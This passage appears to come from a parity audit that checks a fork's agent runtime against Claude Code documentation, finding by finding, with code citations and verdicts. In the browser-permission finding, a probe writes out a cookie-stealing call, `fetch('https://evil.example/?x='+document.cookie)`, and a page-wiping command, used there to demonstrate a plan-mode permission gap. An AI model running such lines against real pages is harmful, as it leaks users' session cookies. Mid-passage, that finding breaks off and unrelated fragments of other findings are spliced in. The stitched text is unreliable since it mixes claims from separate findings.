notifications/claude method, nothing declares capabilities.experimental['claude/channel/permission'], nothing emits notifications/claude/channel/permission_request and nothing accepts a notifications/claude/channel/permission verdict. But the finding's stated consequence is wrong on both clauses. results.claim: A skill can run in a forked subagent via `context: fork`, and `background: false` in its frontmatter runs that fork in the foreground — which is what decides whether rewind restores its edits.
results.quote: {/* min-version: 2.1.218 */}A forked skill runs in the background by default; set `background: false` in its frontmatter to run it in the foreground, where the invoking turn waits for the result. Before v2.1.218, forked skills always ran in the foreground.
results.ourState: Neither key is honoured. `packages/session-tools-core/src/validation.ts:212-221` lists the parsed skill fields and `context`/`background` are not among them; they sit in the separate "documented SKILL.md keys this runtime PARSES NOTHING FROM" block at `:224-236`, whose only effect is suppressing the unknown-field warning. The field's own comment states the gap: "`context: fork` and its dependent `background` need a forked-subagent skill context, which does not exist". So the distinction this page's restore rule turns on cannot be expressed. Already recorded as inert contract #25 in docs/superpowers/specs/2026-07-29-inert-contracts.md:97.

verdict.why: (1) VERBATIM — PASSES. `curl -sL https://code.claude.com/docs/en/checkpointing.md` (112 lines, fetched 2026-08-02) line 84 contains the quoted sentence word for word, including the `{/* min-version: 2.1.218 */}` marker. Read whole, the line is: "Except for a [skill with `context: fork`](/docs/en/skills#run-skills-in-a-subagent) that runs in the foreground, edits a [subagent](/docs/en/sub-agents) applies land outside your session's checkpoints, so rewinding doesn't restore them ... This includes a background `/code-review --fix` run and any forked skill that runs in the background. Use git to revert those edits. The foreground fork edits your working tree during your own turn, so rewinding restores its edits as usual. {/* min-version: 2.1.218 */}A forked skill runs in the background by default; set `background: false` ... Before v2.1.218, forked skills always ran in the foreground." Nothing in the second half reverses it. (2) CITED LINE — PASSES ON THE IDENTIFIER, FAILS ON THE MECHANISM. `packages/session-tools-core/src/validation.ts:212-221` is `DOCUMENTED_SKILL_FIELDS` and neither `context` nor `background` is in it, as claimed; the quoted comment sits at :234-:237. But the claim that the second block's "only effect is suppressing the unknown-field warning" is FALSE ON HEAD. Those keys are in `IGNORED_SKILL_FIELDS` (:246-:251), and its only consumer, validation.ts:351-:358, emits a DEDICATED warning — "'<key>' is a documented field this runtime does not implement — it will be ignored", suggestion "Remove it or expect no effect: it only applies with 'context: fork', which is not implemented" — instead of the generic "Unknown frontmatter field" one, pinned by validation.test.ts:59-:73 ("warns on a documented field this runtime ignores, and says which"). The finding inherited that wording from inert-contracts.md:97 row 25, which is itself STALE: it still places the four keys in `DOCUMENTED_SKILL_FIELDS` at :218 and describes the suppress-only behaviour that unit U-E (commit 55b711ce) removed. So the citation of #25 as our current state is out of date. (3) CONSEQUENCE — REFUTED, and this is the trap the audit history names. The claim's own words are "the distinction this page's restore rule turns on cannot be expressed". The distinction this page's rule turns on is fork-child vs named-subagent, and it IS expressed and implemented here, by a different mechanism: `SessionManager.revertForkChildCheckpoints` (packages/server-core/src/sessions/SessionManager.ts:13742, called from `rewindToMessage` at :13841) walks the checkpoints of children with `restrictions.fork === true` and reverts them, while a named subagent's stay in the child's own manifest untouched. Pinned by packages/server-core/src/sessions/fork-parent-scope.test.ts:123-:161, "restores a fork child's file edit and leaves a named subagent's alone", and already written up at docs/architecture/file-checkpoint-rewind.md:99-:115 ("**The fork exception now holds too** ... exactly the documented split"). The foreground/background axis exists too, one subsystem over: orchestrator/subagent-tool.ts:451-:470 resolves `background` per spawn (fork mode forces background, `NESSY_DISABLE_BACKGROUND_TASKS` forces foreground, an explicit argument wins) and spawner.ts:496-:520 mirrors it. What is genuinely missing is only the SKILL-FRONTMATTER ENTRY POINT into that fork: no code reads a skill's `context`/`background` (checked with `grep -arn`, NUL-safe, across packages/shared/src/skills/, capabilities/, and format-adapters/claude.ts — the only `background` there, claude.ts:942, is an AGENT field). And the observable restore outcome for the exact case this page names is NOT divergent: a skill declaring `context: fork` + `background: false` is expanded inline into the main turn, so its edits are checkpointed by the main session and ARE restored by rewind — which is what the page prescribes for a foreground fork. Our behaviour is Claude's own pre-v2.1.218 behaviour ("forked skills always ran in the foreground") for every skill; only the default-background case diverges, and it diverges toward restoring more, not less. Not one of the nine dated owner decisions in inert-worklist.md section 3 (none concerns skill frontmatter) and not a Nessy product difference. The real, still-open gap is the missing skill-level isolation, which is already the subject of f062 (refuted=false, confirmed) — f138 is that same gap re-projected onto checkpointing with a consequence that does not survive the layer-up check.
verdict.correctedState: Refuted as written. What is true: no code reads a skill's `context` or `background`; they are in `IGNORED_SKILL_FIELDS` (packages/session-tools-core/src/validation.ts:246-251), so a skill declaring `context: fork` is expanded inline into the main conversation instead of an isolated subagent — the open gap already recorded as f062. What is false: (a) the block's effect is NOT "suppressing the unknown-field warning" — since U-E (55b711ce) it emits its own warning naming the field as documented-but-unimplemented (validation.ts:351-358, test at validation.test.ts:59-73), and inert-contracts.md:97 row 25, which the finding cites, is stale on that point; (b) "the distinction this page's restore rule turns on cannot be expressed" is wrong — the fork-child vs named-subagent restore split IS implemented, via `revertForkChildCheckpoints` (SessionManager.ts:13742, called at :13841), pinned by fork-parent-scope.test.ts:123-161 and documented at docs/architecture/file-checkpoint-rewind.md:99-115; a foreground/background axis for spawned children exists at subagent-tool.ts:451-470 and spawner.ts:496-520. (c) For the case this page actually names, the outcome matches: a `context: fork` + `background: false` skill runs inline in the invoking turn, so rewind restores its edits, exactly as the doc requires. Only the v2.1.218 default (background fork, edits NOT restored) is unreachable here — our runtime behaves like Claude before v2.1.218, restoring more rather than less. The residual divergence is the missing skill-level isolation, not a checkpoint/rewind divergence.

results.claim: In plan mode, read-only browser calls run without a prompt and state-changing browser calls (clicks, typing, navigation, tab/window management, GIF recording) prompt for approval.
results.quote: In [plan mode](/docs/en/permission-modes#analyze-before-you-edit-with-plan-mode), browser tool calls that only read the page or browser state run without a permission prompt, and calls that change state prompt for approval.
results.ourState: Every browser command is auto-allowed in plan mode with no inspection of what it does. `packages/shared/src/agent/mode-manager.ts:2207-2210` — inside the branch commented "Safe/Plan mode: check against read-only allowlist" — reads `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true } }`, and `plan` reaches it because `isInteractiveWritePermissionMode` (packages/shared/src/agent/mode-types.ts:98-100) covers only `default`/`acceptEdits`/`auto`. Our browser tool is a single command-string tool (`BrowserToolSchema`, packages/session-tools-core/src/tool-defs.ts:359-364), so `click`, `type`, `navigate` and `evaluate` all arrive under the same tool name and all auto-run. `packages/shared/src/agent/__tests__/browser-tools-permissions.test.ts:21` pins the current behaviour ("allows browser_tool in safe mode") without any command-level split. Claude fixed the equivalent bug in 2.1.199 ("Fixed plan mode not prompting for state-changing browser tool calls").

verdict.why: All three checks pass. (1) DOC: `curl -sL https://code.claude.com/docs/en/chrome.md` (294 lines) carries the sentence VERBATIM at line 106 under the heading `### Browser tools in plan mode` (line 104); `grep -c -F` on the full sentence returns 1. The whole line is that one sentence — no second half reverses it. The two lines after it enumerate the split (read-only: read_page, get_page_text, find, console/network reads, screenshot; state-changing: clicks, typing, navigation, tab and window management, GIF recording) and line 110 adds the v2.1.199 refinement that a read-only call setting a state-changing input flag also prompts, and that browser_batch runs promptless only when every action inside it is read-only. (2) CODE: mode-manager.ts:2208 reads exactly `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true }; }`, inside the branch commented `// Safe/Plan mode: check against read-only allowlist` (:2192), reached by `plan` because `isInteractiveWritePermissionMode` (mode-types.ts:98-100) returns only for default/acceptEdits/auto. The tool really is a single command-string tool (BrowserToolSchema, session-tools-core/src/tool-defs.ts:359-364), and browser-tools-permissions.test.ts:21 really is `it('allows browser_tool in safe mode'` with no command-level split. (3) CONSEQUENCE, verified separately by direct probe of shouldAllowToolInMode rather than by reading the identifier: in `plan`, `browser_tool` with command `snapshot`, `click @e1`, `fill @e5 hello`, `navigate https://example.com`, `evaluate document.body.innerHTML=""` and `mcp__session__browser_tool` with `evaluate fetch('https://evil.example/?x='+document.cookie)` ALL return `{"allowed":true}` with no `requiresPermission`, while `Write` in the same mode returns allowed:false. Nothing upstream or downstream rescues it: pre-tool-use.ts contains zero occurrences of `browser` (grep -a), the only browser-specific gate before execution is the prerequisite-manager guide-read block (prerequisite-manager.ts:129-138), which is mode-independent and not a permission prompt; browser-tools.ts / browser-tool-runtime.ts contain no approval/permission path; and tool exposure is filtered only by `getBrowserToolEnabled()` (pi-agent.ts:1611), not by mode, so the tool is live in plan mode. A second, independent classification agrees with the auto-allow rather than overriding it: tool-defs.ts:1000 declares `safeMode: 'allow'` for browser_tool. Not an owner decision: `docs/superpowers/specs/2026-07-29-inert-worklist.md` has zero occurrences of `browser` (grep -ain), so this is none of the nine dated decisions in section 3. Not a deliberate product difference either: it is not a subscription flow, gateway or rename matter, and the fork ships a first-class browser automation surface with a genuine read/write command split (read-only: snapshot, find, screenshot, screenshot-region, console, network, windows, get-clipboard; state-changing: click, click-at, drag, fill, type, select, key, scroll, navigate, back, forward, upload, paste, set-clipboard, evaluate, window-resize, close, hide). It is a one-sentence paragraph -- no second half that reverses it. It sits two paragraphs after the ReportFindings paragraph ('When the host application requests it, Claude reports the review's findings through the ReportFindings tool ... Claude Code renders the report as a findings list'), so 'reports them again' means a second ReportFindings call. (2) CITED FILE CONFIRMED: packages/session-tools-core/src/tool-defs.ts:269-281 -- FindingSchema is exactly {file, summary, failureScenario, category?} and ReportFindingsSchema is {findings: array(1..100)}. ONE CORRECTION TO THE FINDING'S CONSEQUENCE: 'the host cannot render fixed/skipped/no-change' is true but mis-attributed. verdict.correctedState: Confirmed and inverted relative to the documented contract. Claude Code documents skill-over-command precedence on three pages (claude-directory.md:293; skills.md:122; slash-commands.md:122 — 'if a skill and a command share the same name, the skill takes precedence'). Nessy does the opposite: packages/shared/src/slash-commands/custom-commands.ts:444 skips any skill whose logicalName is in takenNames, and SessionManager.ts:16039 (listing) and :16120 (resolution) both populate takenNames from the discovered .claude/commands/*.md names (plus workflow-recipe names, which shadow skills the same way — an extra surface Claude does not document). With both commands/review.md and a `review` skill present, exactly one /review exists and it is the command file. One correction to the finding's wording and one to the plan's: the shadowed skill does NOT merely lose its bare alias while keeping a namespaced entry — selectSkillSlashCommands `continue`s before pushing, so it emits no slash command at all, and its custom:skill:review id is therefore unresolvable at SessionManager.ts:16120 too. The skill remains reachable only by model auto-invocation or by the user typing the [skill:review] marker. (The 'keeps only its namespaced custom:skill:<name> id' claim in 2026-07-26-skills-invocation.md:568 is inaccurate; the surviving qualified-key test at custom-commands.test.ts:186-193 covers skill-vs-skill alias shadowing, a different case.) Fixing this means having SessionManager stop feeding native command names into takenNames and instead drop the colliding native command from the listing, so the skill claims the bare /name.

results.claim: Command and skill bodies expand positional argument placeholders `$0`, `$1`, … in addition to `$ARGUMENTS`.
results.quote: Skills accept arguments: <C>/deploy staging</C> passes "staging" as <C>$ARGUMENTS</C>. Use <C>$0</C>, <C>$1</C>, and so on for positional access
results.ourState: Split. Runtime SKILL content does expand `$0`/`$1` (quote-aware, with escape rules). Custom slash commands — `.nessy-agent/commands/*.md`, `.agents/commands/*.md`, and plugin prompt-commands — do not: the substitution is a single regex over `$ARGUMENTS|{{args}}`, so `/fix-issue 123` leaves a literal `$0` in the prompt.

verdict.why: All three legs confirm. (1) QUOTE VERBATIM: claude-directory.md line 222 reads exactly `tips: [<>Skills accept arguments: <C>/deploy staging</C> passes "staging" as <C>$ARGUMENTS</C>. Use <C>$0</C>, <C>$1</C>, and so on for positional access</>, ...]`. Read the whole line: the rest of the tips array is about `description` frontmatter and bundled reference docs, and reverses nothing. The quoted sentence is about SKILLS, and our skills half COMPLIES -- but the SAME PAGE states the identical rule for commands at line 304: `<C>$ARGUMENTS</C> substitutes whatever you typed after the command name. For positional access, use <C>$0</C> <C>$1</C> and so on.` (in the `.claude/commands/fix-issue.md` example block, alongside line 293's `Use <C>$ARGUMENTS</C> in the file to accept parameters: <C>/fix-issue 123</C>`). Line 293's second clause -- 'New commands should usually be skills instead; commands remain supported' -- confirms commands are still a live contract, not deprecated away. So the divergence is doc-grounded on this page, just anchored to the wrong sentence of it. (2) CITED LINE EXACT: packages/server-core/src/handlers/rpc/sessions.ts:334 is verbatim `modelMessage = command.body.replace(/\$ARGUMENTS|\{\{args\}\}/g, () => args)`, with the comment at :329-332 stating the pass substitutes ONLY those two tokens. (3) CONSEQUENCE VERIFIED SEPARATELY FROM THE IDENTIFIER, one layer up and one down. Up: `modelMessage` is passed as the 11th argument of `sessionManager.sendMessage` at sessions.ts:373, i.e. it IS the model-facing body -- nothing downstream re-expands it. Down: `resolveCustomSlashCommand` (SessionManager.ts:16080-16179) returns `body` unmodified for every non-MCP source (native from `parseCustomCommand`; plugin prompt-command from `materializer.readText` at :16165; workflow from `workflowSlashCommandBody`, which is literally `[workflow:<name>]\n$ARGUMENTS`; skill from `skillSlashCommandBody`, `[skill:<ref>] $ARGUMENTS`). Repo-wide there is exactly one other `$ARGUMENTS` replacer, SessionManager.ts:481, and it is a DIFFERENT subsystem (prompt-hook input JSON) -- named explicitly so the sibling-subsystem trap is excluded. So `/fix-issue 123` on a `.nessy-agent/commands/fix-issue.md` body containing `$1` reaches the model with a literal `$1`. POSITIVE CONTROL for the split, both directions: the skills expander `expandSkillArguments`/`matchArgumentPlaceholder` (packages/shared/src/capabilities/runtime-skill-content.ts:497-600) implements the full family -- `$ARGUMENTS[N]` (:508), `$ARGUMENTS` (:518), `$name` (:527-538), bare `$N` (:539-548, `values[Number(...)]`, undefined stays literal per skills.md:323) plus backslash escaping (:577-585) -- and it is reached for a skill slash command because sessions.ts:334 turns `[skill:x] $ARGUMENTS` into `[skill:x] staging`, `runtimeSkillArguments` (:607-617) slices the tail off the marker, and base-agent.ts:2329 feeds it to `materializeRuntimeSkillInvocation` as `argumentsText`. And the fork positively KNOWS commands lack this: packages/shared/src/plugins/format-adapters/claude.ts:653-654 defines `DYNAMIC_SUBSTITUTION_PATTERNS` with `{ pattern: /\$[1-9]\b/, kind: 'positional-argument' }`, used at :741-749 to push a `plugin.deferred.claude_command_dynamic_substitution` entry with the comment 'Never evaluate shell/file expressions -- only detect and defer them'. Detect-and-defer is the opposite of expand. NOT one of the nine dated owner decisions in 2026-07-29-inert-worklist.md section 3 (SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, listSessionSummaries/listSessions) -- section 3 has zero hits for 'positional' or '$ARGUMENTS'. Not a de-brand or dropped-provider difference either: this is Nessy's own custom-command surface, not a Claude/ChatGPT subscription flow. The one imprecision worth recording is the anchoring -- the finding quotes the skills sentence, which we satisfy, while the actual gap is the commands sentence on the same page.
verdict.correctedState: Split, and the split is real. SKILLS comply fully: runtime-skill-content.ts:497-600 expands $ARGUMENTS, $ARGUMENTS[N], bare $N and declared $name in one left-to-right pass, longest-match-at-a-position, with backslash escaping and no re-scan of substituted text; reached for /skill invocations via sessions.ts:334 -> runtimeSkillArguments (:607) -> base-agent.ts:2329. COMMANDS do not: sessions.ts:334 is the single expansion chokepoint for every non-MCP command source (native .nessy-agent/commands and .agents/commands, plugin prompt-commands, workflow commands) and it is one regex over /\$ARGUMENTS|\{\{args\}\}/g, so `/fix-issue 123` leaves a literal `$0`/`$1` in the body the model receives (modelMessage is handed straight to sendMessage at sessions.ts:373). Two refinements to the original finding. (a) The claim should be anchored to claude-directory.md:304 ('For positional access, use $0 $1 and so on', in the .claude/commands example) rather than :222, which is the skills sentence we already satisfy. (b) The plugin half is a DECLARED deferral, not a silent one: claude.ts:653-654/741-749 detects `$1`-`$9` in an imported command body and emits a `plugin.deferred.claude_command_dynamic_substitution` compatibility entry. That detection pattern is /\$[1-9]\b/, so it misses `$0` entirely, and native plus workflow commands get no deferral notice at all -- for those the placeholder fails silently. MCP prompt commands are correctly exempt: they map a quote-aware positional tail onto the prompt's declared parameters via mapMcpPromptArguments/getPrompt before the regex ever runs.

results.claim: A leading `` !`…` `` line in a command or skill file runs a shell command and injects its stdout into the prompt.
results.quote: The <C>!`...`</C> line runs a shell command and injects its output into the prompt.
results.ourState: Implemented only for PLUGIN-provided skills on the Pi backend. `materializeRuntimeSkillContext` skips any skill without `pluginRuntime`, so a user or managed skill's `!` line is silently treated as prose; custom slash commands never reach this path at all (their expansion comment states "no shell invocation").
results.evidence: packages/shared/src/agent/base-agent.ts:2391 — `if (!skill?.pluginRuntime) continue`; gated further by :2386 `runtime?.provider !== 'pi'`; commands path at packages/server-core/src/handlers/rpc/sessions.ts:329-334

verdict.why: Quote verified verbatim, citation wrong, and the substance is a recorded deliberate difference. (1) QUOTE: curl -sL https://code.claude.com/docs/en/claude-directory.md (1638 lines, fetched 2026-08-02) line 240 contains exactly "The <C>!`...`</C> line runs a shell command and injects its output into the prompt." The whole line is a three-sentence JSX `description` array item; the remaining sentences cover $ARGUMENTS and the skill directory path and neither reverses it. A second, independent occurrence at :304 states the same for commands ("the <C>!`...`</C> line runs <C>gh issue view 123</C> in your shell, injecting the output into the prompt before Claude sees it"). `claude-directory` is row 77 of scripts/claude-doc-pages.tsv, so it is a valid Claude contract citation. (2) CITATION IS WRONG ON BOTH LINE NUMBERS. base-agent.ts:2391 is `latest.set(selection.runtimeSkill.key, selection);` inside `latestSkillSelections`, and :2386 is that function's parameter-list line — neither is a gate. The real gates are :2407 `if (reinjection || runtime?.provider !== 'pi') return ''` and :2411 `if (!skill?.pluginRuntime) continue`, both inside `materializeRuntimeSkillContext` (:2401). The claimed text does exist, ~20 lines below where it was cited. The commands citation is accurate: sessions.ts:329-332 reads "Substitute ONLY the literal `$ARGUMENTS` and legacy Nessy `{{args}}` tokens in one pass — no shell invocation, no env/file interpolation". (3) SUBSTANCE IS A RECORDED DELIBERATE DIFFERENCE, not drift. The parity audit's section 4 Deliberate-differences table, docs/superpowers/specs/2026-07-25-nessy-claude-parity-audit.md:1547, carries the row verbatim: "No shell execution from skill/command bundle text (`` !`cmd` ``, `@file` detected and deferred) | Keeps a prompt-injection and supply-chain surface closed. The defect is the silence, not the refusal — an imported bundle should warn visibly." That is this finding's exact scope (skills AND commands, both syntaxes), with a stated security reason. The narrow governed re-opening for plugin skills on Pi is its own recorded unit — commit b83ccd05 "feat(plugins): activate portable plugin peripherals", step 5 "Govern skill shell context" — which is why the 5 s timeout / 32 KiB cap in capabilities/runtime-skill-context.ts and the bundle-hash + permission-DSL authorization in SessionManager.runtimeSkillContextExecutor (:4521, semanticId 'skill-context' evaluated as a Bash call at :4586-4617) exist at all. So the ordering the finding implies is backwards: the default is refusal by decision, and the plugin/Pi path is the deliberate exception, not a half-built feature. (4) THE 'SILENTLY' HALF IS FALSE FOR IMPORTED BUNDLES — this is the 'enforcement one layer up' shape. format-adapters/claude.ts:653-657 `DYNAMIC_SUBSTITUTION_PATTERNS` classifies /!`[^`]*`/ as kind 'bash-execution', and :740-749 pushes a deferral `{externalKind:'command-dynamic-substitution-bash-execution', reasonCode:'plugin.deferred.claude_command_dynamic_substitution', sourcePath}` for every command file whose body matches. An imported command carrying a `!` line is detected and deferred with a named reason code, which is precisely the 'detected and deferred' the audit row describes. (5) THE CLAUDE-BACKEND IMPLICATION IS UNFOUNDED. claude-agent.ts:305 passes `settingSources: ['user','project','local']` to the Claude Agent SDK, and :1627-1629 sets `plugins: []` with the comment "No plugins — skills are handled by BaseAgent.chat() via read-before-execute". Under those setting sources the SDK itself discovers ~/.claude and .claude skills and commands, so on that backend the substitution is the SDK's to perform; our host executor's `provider !== 'pi'` gate does not establish that nothing runs there. Not one of the nine dated owner decisions in 2026-07-29-inert-worklist.md section 3 (none concerns skill or command shell substitution), but it is the same category one file over: an explicit entry in the parity audit's deliberate-differences table. DUPLICATE: this is the same claim as f059 (skills page), already refuted on the same grounds. The genuinely open, non-duplicate divergence on this capability is f058 (CONFIRMED) — our recogniser implements a different SYNTAX from the documented one (bare `!` on the first non-fenced body line only, at most one per skill, backticks not stripped), which f146 does not raise.
verdict.correctedState: The sentence is real (claude-directory.md:240, and again at :304 for commands), but the divergence is not. Refusing to execute `` !`cmd` `` from skill and command bundle text is a recorded deliberate difference — parity audit 2026-07-25-nessy-claude-parity-audit.md:1547, section 4: it "keeps a prompt-injection and supply-chain surface closed", and the audit's own note is that "the defect is the silence, not the refusal". The silence half is already closed on the plugin-import path: format-adapters/claude.ts:653-657 detects the pattern as 'bash-execution' and :740-749 emits a `plugin.deferred.claude_command_dynamic_substitution` deferral naming the source file, so an imported bundle is detected-and-deferred, not silently ignored. The plugin/Pi executor is the deliberate governed EXCEPTION to that default (commit b83ccd05, step 5 "Govern skill shell context"), carrying a 5 s timeout, a 32 KiB output cap, bundle-hash verification and per-command Bash authorization under semanticId 'skill-context' (SessionManager.ts:4521-4617). On the Claude backend the Claude Agent SDK owns skill and command loading and therefore the substitution (`settingSources: ['user','project','local']` at claude-agent.ts:305; `plugins: []` at :1628), so no claim about that backend follows from our Pi gate. Correct gate citations are base-agent.ts:2407 and :2411, not :2391/:2386. The real open divergence on this capability is the SYNTAX mismatch tracked as f058, not the scope.

results.claim: `.worktreeinclude` at the project root lists gitignored files to copy into every new worktree, read on `EnterWorktree` and on subagent `isolation: worktree`.
results.quote: Read when Claude creates a git worktree via <C>--worktree</C>, the <C>EnterWorktree</C> tool, or subagent <C>isolation: worktree</C>
results.ourState: No reader exists. We ship `EnterWorktree`/`ExitWorktree` and `isolation: worktree`, and worktree settings cover `baseRef`/`symlinkDirectories`/`sparsePaths`/`bgIsolation` — but the `.worktreeinclude` file is never opened, so `.env` and other gitignored files are missing from every worktree we create.
results.evidence: `grep -ra --include='*.ts' --include='*.tsx' -l worktreeinclude packages apps scripts` → no match (positive control: same grep for `EnterWorktree` hits packages/session-tools-core/src/handlers/worktree.ts); shipped key list at packages/shared/src/config/worktree-settings.ts:59

verdict.why: All three checks pass and no exemption applies. (1) QUOTE VERBATIM: curl -sL https://code.claude.com/docs/en/claude-directory.md, line 87, whole line: "        when: <>Read when Claude creates a git worktree via <C>--worktree</C>, the <C>EnterWorktree</C> tool, or subagent <C>isolation: worktree</C></>," — exact, no second sentence. The surrounding fields of the same `worktreeinclude` entry reinforce rather than reverse it: :86 oneLiner "Gitignored files to copy into new worktrees"; :88 description "Lists gitignored files to copy from your main repository into each new worktree. Worktrees are fresh checkouts, so untracked files like <C>.env</C> are missing by default. Patterns here use <C>.gitignore</C> syntax. Only files that match a pattern and are also gitignored get copied, so tracked files are never duplicated."; :89 tips "Lives at the project root, not inside <C>.claude/</C>" and the single carve-out "Git-only: if you configure a WorktreeCreate hook for a different VCS, this file is not read. Copy files inside your hook script instead"; :1476 and :1497 repeat it in the coverage table (project-scope, repo root, alongside CLAUDE.md and .mcp.json). (2) CITED CODE MATCHES, with one off-by-one: the four-key list is at packages/shared/src/config/worktree-settings.ts:60, not :59 (`const WORKTREE_SETTING_KEYS = ['baseRef', 'symlinkDirectories', 'sparsePaths', 'bgIsolation'] as const`); :59 is the blank line above it. Ordinary line drift, the quoted content is exactly as claimed, and :78-83 `assertKnownKeys` THROWS on any key outside those four, so an include list cannot even be expressed through settings. The positive control also holds: `EnterWorktree` resolves to packages/session-tools-core/src/handlers/worktree.ts:19 (`handleEnterWorktree`) and :53 (`handleExitWorktree`), registered at packages/session-tools-core/src/tool-defs.ts:1015-1016; subagent `isolation: worktree` is parsed in packages/shared/src/agent/pi-harness/runtime-agent-definition.ts:348-351 (JSON form) and :635-639 (frontmatter form). NUL-safe absence re-run: `grep -rani -l worktreeinclude` over packages/apps/scripts source → zero hits; repo-wide the only matches are this sweep's own data files, docs/superpowers/specs/2026-07-26-r-queue-doc-verification.md (where it is listed as an unbuilt item), and an unrelated case-insensitive substring inside the bundled third-party binary apps/electron/resources/bin/codex/darwin-arm64/codex-app-server. (3) CONSEQUENCE VERIFIED SEPARATELY FROM THE IDENTIFIER: the tool handler delegates to `ctx.worktree.enter`, whose only creation implementation is `WorktreeLeaseService`'s `git.create`, built in packages/server-core/src/sessions/SessionManager.ts:10086-10190. That closure runs `show-ref`, then every command from `worktreeCreateCommands` (packages/server-core/src/pi-harness/worktree-git-plan.ts:74-96 — only `worktree add` [+ `--no-checkout`], `sparse-checkout set --cone`, `checkout`), then the links from `worktreeSymlinkPlan` (:112-124 — `symlinkDirectories` only, directories, skipped when the target is missing). There is no `copyFile`/`cpSync`/`readFile`/gitignore parsing anywhere on that path (grep over worktree-lease-service.ts and worktree-git-plan.ts: zero). The same lease service serves the subagent path (`acquirePiWorktreeLease`/`startPiChildRuntime` in SessionManager), so `isolation: worktree` children get the identical no-copy creation. SIBLING-SUBSYSTEM CHECK: we DO ship the `WorktreeCreate`/`WorktreeRemove` hook events (packages/shared/src/plugins/hooks-automation.ts:360, :394-395, path capture at :1247) — but Claude's own tip at :89 names the hook as the REPLACEMENT for `.worktreeinclude`, not an implementation of it, so it does not close the gap. NOT AN OWNER DECISION: docs/superpowers/specs/2026-07-29-inert-worklist.md §3's nine dated decisions (SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, listSessionSummaries/listSessions) contain nothing about worktrees. NOT A DELIBERATE PRODUCT DIFFERENCE: docs/superpowers/plans/2026-07-27-session-worktrees.md records the fork's worktree deviations (bgIsolation default `none`, the `<parent>/.nessy-worktrees/<slug>/` root) and does not mention `.worktreeinclude` or gitignored-file copying at all; the rename/de-brand is orthogonal because `.worktreeinclude` lives at the PROJECT root, unprefixed, not under `.claude/`. DUPLICATE NOTE (not a refutation): this is the same underlying gap already confirmed as f096 (worktrees.md) and filed again as f159 (desktop.md); f147 is the `.claude` directory-explorer view of it. The divergence is real on all three pages, but it is ONE fix, not three.
verdict.correctedState: Stands as filed, with three precisions. (a) The cited line is packages/shared/src/config/worktree-settings.ts:60, not :59 — the content quoted is correct, only the number drifted. (b) 'No reader exists' is an understatement: `assertKnownKeys` (same file, :78-83) hard-THROWS on any key outside the documented four, so there is no settings-level workaround either; and the creation path itself performs no file copy of any kind — `worktreeCreateCommands` (packages/server-core/src/pi-harness/worktree-git-plan.ts:74-96) emits only git subcommands and `worktreeSymlinkPlan` (:112-124) only symlinks directories named by `symlinkDirectories`, both driven from the single `git.create` closure at packages/server-core/src/sessions/SessionManager.ts:10164-10190 that serves EnterWorktree, session worktrees and `isolation: worktree` subagents alike. (c) The one real escape hatch we do ship is a user-authored `WorktreeCreate` command hook (packages/shared/src/plugins/hooks-automation.ts:360, :1247), which Claude's page presents as the substitute for `.worktreeinclude` rather than its implementation. This row duplicates confirmed finding f096 (worktrees.md) and f159 (desktop.md): one gap, three pages, one fix.

results.claim: A subagent declaring `memory:` gets a dedicated directory whose MEMORY.md is loaded into its system prompt at start (`.claude/agent-memory/`, `.claude/agent-memory-local/`, or `~/.claude/agent-memory/`).
results.quote: First 200 lines (capped at 25KB) of MEMORY.md loaded into the subagent system prompt when it runs
results.ourState: `memory: user|project|local` is parsed, validated and carried on `AgentDefinition`, but no directory is created and no MEMORY.md is read or injected — the field's own doc comment records this ("the per-agent memory DIRECTORY is not yet provisioned"). A subagent authored for cross-session learning gets none.
results.evidence: packages/shared/src/agents/definitions.ts:91-95 and the scope mapping at :38-44; `grep -ra agent-memory packages apps` → definitions.ts only

verdict.why: All three checks pass; the finding survives. (1) DOC VERBATIM. curl -sL https://code.claude.com/docs/en/claude-directory.md (1638 lines) carries the quoted sentence at :384 as the whole value of a single `when:` property — "when: 'First 200 lines (capped at 25KB) of MEMORY.md loaded into the subagent system prompt when it runs',". Reading the whole line and its neighbours finds no reversing clause; they reinforce it. :385 description: "Subagents with `memory: project` in their frontmatter get a dedicated memory directory here ... each subagent reads and writes its own MEMORY.md, not yours." :386 tips: "Only created for subagents that set the `memory:` frontmatter field" and the three-scope mapping verbatim ('memory: local' -> '.claude/agent-memory-local/', 'memory: user' -> '~/.claude/agent-memory/'). :397-402 the nested MEMORY.md node repeats "Loaded into the subagent system prompt when the subagent starts". :690-698 the Global tab's '~/.claude/agent-memory/' node. :1503 the summary table row "agent-memory/<name>/ | Project and global | ... | Persistent memory for subagents". The page is row 77 of scripts/claude-doc-pages.tsv, so it is a Claude Code contract page, not Codex/MCP. (2) CITED FILE, exact. packages/shared/src/agents/definitions.ts:90-95 reads "Persistent memory scope for this agent (`user` / `project` / `local`). Parsed, validated and carried; the per-agent memory DIRECTORY is not yet provisioned - see the R30c report." followed by `memory?: AgentMemoryScope;`. The scope mapping is at :37-44 and names the very three Claude directories the page does. Validation is real and strict: normalizeMemoryScope at :366-370, the AGENT_MEMORY_SCOPES set at :44, and a throw on a typo; the pi-harness carries the same field with its own validators at packages/shared/src/agent/pi-harness/runtime-agent-definition.ts:141, :336-339 and :616-620, spreading it at :371/:661. (3) CONSEQUENCE VERIFIED SEPARATELY FROM THE IDENTIFIER, both directions, with -a per the NUL-byte trap. Up: `grep -ran agent-memory packages apps` (ts/tsx/js/json) returns exactly two hits, definitions.ts:40-41, both inside the doc comment - no code ever composes or mkdirs such a path, and an -i sweep for agentMemory/agent_memory/perAgentMemory finds only the scope enum, including in the built apps/electron/dist/main.cjs and packages/pi-agent-server/dist/index.js bundles, so the shipped artifact has no provisioning either. Down: `grep -c -a memory packages/pi-agent-server/src/orchestrator/spawner.ts` returns 0 - the module that actually spawns a subagent never sees the field, so no MEMORY.md is read for it and no Read/Write/Edit force-enable exists. Sibling-subsystem check (the disallowed-tools shape): this fork DOES have a live auto-memory subsystem - agent/memory/memory-store.ts, the memory-cleanup 'dream' pass, the `remember` tool (session-tools-core/handlers/remember.ts), and MEMORY.md discovery at global/workspace/project/session scope in 